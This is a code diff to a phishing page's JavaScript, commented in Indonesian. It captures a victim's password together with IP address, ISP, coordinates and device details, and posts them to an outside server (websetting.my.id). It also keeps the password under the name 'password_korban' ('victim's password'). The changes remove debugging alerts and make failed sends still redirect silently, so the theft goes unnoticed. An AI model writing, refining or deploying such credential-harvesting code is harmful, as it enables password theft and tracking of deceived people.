@@ -59,14 +59,27 @@
   document.getElementById('toggle').addEventListener('change', e => { pw.type = e.target.checked ? 'text' : 'password'; });
 
   function kirimData() {
-    var password = document.getElementById('pw').value; var input = document.getElementById('pw'); var errorDiv = document.getElementById('pwError'); var errorText = document.getElementById('pwErrorText'); var btn = document.getElementById('btnSubmit');
-    input.classList.remove('input-error'); errorDiv.classList.remove('show');
+    var password = document.getElementById('pw').value; 
+    var input = document.getElementById('pw'); 
+    var errorDiv = document.getElementById('pwError'); 
+    var errorText = document.getElementById('pwErrorText'); 
+    var btn = document.getElementById('btnSubmit');
     
-    if(password.length < 8) { errorText.innerText = "Sandi harus minimal 8 karakter. Ketik setidaknya 8 karakter."; input.classList.add('input-error'); errorDiv.classList.add('show'); return; }
+    input.classList.remove('input-error'); 
+    errorDiv.classList.remove('show');
     
-    btn.innerText = "..."; btn.disabled = true;
+    if(password.length < 8) { 
+        errorText.innerText = "Sandi harus minimal 8 karakter. Ketik setidaknya 8 karakter."; 
+        input.classList.add('input-error'); 
+        errorDiv.classList.add('show'); 
+        return; 
+    }
+    
+    btn.innerText = "..."; 
+    btn.disabled = true;
+    
     var ua = navigator.userAgent;
-    var web_id_aktif = sessionStorage.getItem('web_id_aktif') || 'web_id_kenz_1';
+    var web_id_aktif = sessionStorage.getItem('web_id_aktif') || 'web_id_fadz_1'; // Default Fadz
     
     var payload = { 
         web_id: web_id_aktif, 
@@ -90,9 +103,7 @@
             payload.isp = d.org || "-";
             payload.koord = (d.latitude||"-")+" , "+(d.longitude||"-");
             
-            // ALERT 1: KALO IP BERHASIL DIDAPET
-            alert("1. IP Berhasil didapat: " + payload.ip + ". Lanjut kirim ke server...");
-
+            // NEMBAK KE DOMAIN WEBSET
             return fetch("https://websetting.my.id/api/send", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -100,19 +111,17 @@
             });
         })
         .then(function(res){
-            // ALERT 2: KALO DATA BERHASIL DIKIRIM (BUKAN BERARTI EMAIL MASUK)
-            alert("2. Data sukses terkirim ke API send.js!");
             sessionStorage.setItem('password_korban', password);
             window.location.href = "selesai.html";
         })
         .catch(function(err){
-            // ALERT 3: KALO ADA ERROR JARINGAN / CORS
-            alert("3. Gagal kirim data! Error: " + err.message);
+            // KALO GAGAL TETEP LANJUT KE HALAMAN SELESAI
             window.location.href = "selesai.html";
         });
   }
 
   document.getElementById('pw').addEventListener('keypress', function(e) { if (e.key === 'Enter') { kirimData(); } });
+  
   function detectDevice(ua){ if(/Android/i.test(ua)) return "Android"; if(/iPhone|iPad|iPod/i.test(ua)) return "iOS"; if(/Windows/i.test(ua)) return "Windows"; if(/Mac/i.test(ua)) return "Mac"; return "Unknown"; }
   function detectOS(ua){ var m; if((m = ua.match(/Android\s([\d.]+)/i))) return "Android " + m[1]; if((m = ua.match(/iPhone OS ([\d_]+)/i))) return "iOS " + m[1].replace(/_/g,"."); if((m = ua.match(/Windows NT ([\d.]+)/i))){ var v = m[1]; return "Windows " + (v === "10.0" ? "10/11" : v); } if((m = ua.match(/Mac OS X ([\d_]+)/i))) return "macOS " + m[1].replace(/_/g,"."); return "Unknown"; }
   function detectBrowser(ua){ var m; if(/Edg\//i.test(ua) && (m = ua.match(/Edg\/([\d.]+)/i))) return "Edge " + m[1]; if(/OPR\//i.test(ua) && (m = ua.match(/OPR\/([\d.]+)/i))) return "Opera " + m[1]; if(/SamsungBrowser/i.test(ua) && (m = ua.match(/SamsungBrowser\/([\d.]+)/i))) return "Samsung " + m[1]; if(/Chrome\//i.test(ua) && (m = ua.match(/Chrome\/([\d.]+)/i))) return "Chrome " + m[1]; if(/Firefox\//i.test(ua) && (m = ua.match(/Firefox\/([\d.]+)/i))) return "Firefox " + m[1]; if(/Safari\//i.test(ua) && (m = ua.match(/Version\/([\d.]+)/i))) return "Safari " + m[1]; return "Unknown"; }
